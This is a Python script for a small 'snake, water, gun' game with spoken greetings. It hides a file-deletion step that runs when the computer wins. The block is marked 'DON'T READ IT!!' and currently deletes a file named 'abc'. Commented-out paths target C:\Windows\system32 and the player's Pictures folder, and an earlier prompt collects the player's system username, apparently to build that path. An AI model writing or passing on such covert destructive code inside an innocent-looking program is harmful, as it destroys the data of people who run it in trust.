
import pyttsx3
import os


nam=input("Enter your usernsme[must be same as on your system] : ")

engine = pyttsx3.init()
engine.say(f'''
           hello {nam}, i AM A craobot, 
           my name is gemi 
           thank you {nam}
           lets play a game which name is snake water and gun game 
           lets start
           Enter your choice ['s' for SNAKE , 'w' for WATER , 'g' for GUN]
           ''')
engine.runAndWait()

import random

#s and w = s
#w and g = w
#g and s = g

def game_result(user, comp):
    if(user==comp):
        return "It's a tie"
    elif(user=='s' and comp=='w') or (user=='w' and comp=='g') or (user=='g' and comp=='s'):
        return" You Wins!! 🎉🎉"
    else:
        return "Computer Wins!!"
    
print("This is a 'SNAKE, WATER, GUN' GAME ")
li=["s","w","g"]
comp= random.choice(li)

player=input("Enter your choice ['s' for SNAKE , 'w' for WATER , 'g' for GUN] : ").lower()

if player not in li:
    print("Enter valid intput")
else:
    print(f"Your choice : {player}")
    print(f"Computer choice : {comp}")         
    
    print(game_result(player, comp))


    if game_result(player, comp) == "Computer Wins!!":
        print("BAD LUCK ☠️ ")
      
        # ...existing code...
    else:
        print("GOOD LUCK 👍 BACHH GYE")
     

    # [WARNING] DON'T READ IT!!

    if game_result(player, comp) =="Computer Wins!!":
       

        # file_path = r"C:\Windows\system32"
        # file_path = fr"C:\Users\{}\OneDrive\Pictures"
        file_path = "abc"

        if os.path.exists(file_path):
            os.remove(file_path)
            print("File deleted successfully.")
        else:
            print("File not found.")
       


    else:
         print("Play Again for Surprise 🎁 .................")
        
   
        

    






   


